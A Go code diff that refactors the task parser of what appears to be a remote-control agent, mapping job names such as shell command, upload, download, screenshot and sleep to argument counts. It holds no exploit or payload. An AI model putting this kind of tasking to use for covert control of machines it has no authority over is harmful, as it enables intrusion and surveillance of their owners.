@@ -30,6 +30,47 @@ const (
 	MSG
 )
 
+type JobTypeInfo struct {
+	jtype JobType
+	argsN int
+	// maybe also add handler function
+}
+
+var jobTypesMap = map[string]*JobTypeInfo{
+	"cmd": {
+		jtype: SHELL_CMD,
+		argsN: -1,
+	},
+	"upload": {
+		jtype: UPLOAD,
+		argsN: 1,
+	},
+	"download": {
+		jtype: DOWNLOAD,
+		argsN: 2,
+	},
+	"sleep": {
+		jtype: SLEEP,
+		argsN: 1,
+	},
+	"boost": {
+		jtype: BOOST,
+		argsN: 1,
+	},
+	"chdir": {
+		jtype: CHDIR,
+		argsN: 1,
+	},
+	"msg": {
+		jtype: MSG,
+		argsN: 2,
+	},
+	"shot": {
+		jtype: SCREENSHOT,
+		argsN: 0,
+	},
+}
+
 func (j *Job) parse() (JobType, []string) {
 	values := utils.SplitArgsStr(j.Todo)
 	if len(values) == 0 {
@@ -37,24 +78,12 @@ func (j *Job) parse() (JobType, []string) {
 	}
 	jobType := values[0]
 	jobArgs := values[1:]
-	n := len(jobArgs)
-	// TODO: use map with jobType and argsCount?
-	if jobType == "cmd" {
-		return SHELL_CMD, jobArgs
-	} else if jobType == "upload" && n == 1 {
-		return UPLOAD, jobArgs
-	} else if jobType == "download" && n == 2 {
-		return DOWNLOAD, jobArgs
-	} else if jobType == "sleep" && n == 1 {
-		return SLEEP, jobArgs
-	} else if jobType == "boost" && n == 1 {
-		return BOOST, jobArgs
-	} else if jobType == "chdir" && n == 1 {
-		return CHDIR, jobArgs
-	} else if jobType == "msg" && n == 2 {
-		return MSG, jobArgs
-	} else if jobType == "shot" {
-		return SCREENSHOT, nil
+	jobTypeInfo, ok := jobTypesMap[jobType]
+	if !ok {
+		return UNKNOWN, nil
+	}
+	if jobTypeInfo.argsN == -1 || jobTypeInfo.argsN == len(jobArgs) {
+		return jobTypeInfo.jtype, jobArgs
 	}
 	return UNKNOWN, nil
 }
